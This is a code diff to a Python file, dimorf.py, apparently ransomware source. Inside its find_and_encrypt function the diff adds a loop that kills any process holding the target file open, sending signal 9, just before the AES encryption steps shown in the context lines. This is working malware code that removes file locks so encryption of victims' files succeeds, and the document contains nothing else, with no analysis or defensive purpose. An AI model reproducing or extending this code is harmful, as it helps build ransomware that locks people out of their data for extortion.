@@ -9,6 +9,7 @@ __module__ = 'dimorf.py'
 
 import sys
 import os
+from psutil import process_iter
 from time import sleep
 from Crypto.Cipher import AES
 from Crypto import Random
@@ -123,6 +124,18 @@ def find_and_encrypt(
                             )
                         )
                     ):
+                        for proc in process_iter():
+                            try:
+                                if proc.open_files():
+                                    for f in proc.open_files():
+                                        if f.path == os.path.join(
+                                            root,
+                                            file
+                                        ):
+                                            os.kill(proc.pid, 9)
+                            except Exception:
+                                pass
+                        
                         
                         # # beginning encrypt operations.
                         init_vector = Random.new().read(16)
